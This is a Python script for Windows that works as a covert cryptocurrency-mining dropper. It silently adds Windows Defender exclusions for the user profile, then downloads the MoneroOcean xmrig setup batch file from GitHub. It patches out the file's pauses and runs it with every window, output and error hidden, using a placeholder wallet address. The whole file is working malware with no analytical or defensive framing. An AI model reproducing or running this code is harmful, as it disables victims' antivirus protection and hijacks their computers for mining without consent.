import os
import subprocess
import tempfile
import time

def defender(folder_path):

    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0 
        
        subprocess.Popen(
            f'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \'{folder_path}\'"',
            shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW | 0x08000000, 
            startupinfo=startupinfo,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        time.sleep(0.5) 
    except:
        pass

def exec(wallet_address):
    
    user_profile = os.environ.get('USERPROFILE')
    
    defender(os.path.join(user_profile, "moneroocean"))
    defender(user_profile)
    
    script_url = "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat"
    temp_script = os.path.join(tempfile.gettempdir(), f"mo_{os.getpid()}.bat")
    
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0  # SW_HIDE
    
    download_ps = f'''
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
try {{
    Invoke-WebRequest -Uri '{script_url}' -OutFile '{temp_script}' -UseBasicParsing
}} catch {{
    exit 1
}}
'''
    
    try:
        temp_ps = os.path.join(tempfile.gettempdir(), f"dl_{os.getpid()}.ps1")
        with open(temp_ps, 'w') as f:
            f.write(download_ps)
        
        proc = subprocess.Popen(
            f'powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "{temp_ps}"',
            shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW | 0x08000000,
            startupinfo=startupinfo,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        proc.wait(timeout=30)
        
        try:
            os.remove(temp_ps)
        except:
            pass
        
        if not os.path.exists(temp_script) or os.path.getsize(temp_script) < 100:

            subprocess.Popen(
                f'curl.exe -s -L -o "{temp_script}" "{script_url}"',
                shell=False,
                creationflags=subprocess.CREATE_NO_WINDOW | 0x08000000,
                startupinfo=startupinfo,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            ).wait(timeout=30)
        
        if not os.path.exists(temp_script):
            return False
        
    except:
        return False
    
    try:
        with open(temp_script, 'r', encoding='utf-8', errors='ignore') as f:
            script_content = f.read()
        
        script_content = script_content.replace('pause', 'rem paused')
        script_content = script_content.replace('PAUSE', 'rem paused')
        script_content = script_content.replace('Pause', 'rem paused')
        
        script_content = '@echo off\n' + script_content
        
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_content)
    except:
        pass
    try:
        cmd = f'cmd.exe /c "{temp_script}" {wallet_address}'
        proc = subprocess.Popen(
            cmd,
            shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW | 0x08000000,
            startupinfo=startupinfo,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            cwd=user_profile
        )
        
        proc.wait(timeout=600) 
        
        try:
            os.remove(temp_script)
        except:
            pass
        
        return True
        
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
            os.remove(temp_script)
        except:
            pass
        return False
    except:
        try:
            os.remove(temp_script)
        except:
            pass
        return False

def main():
    wallet_address = "enter_your_wallet_here"
    exec(wallet_address)

if __name__ == "__main__":
    main()
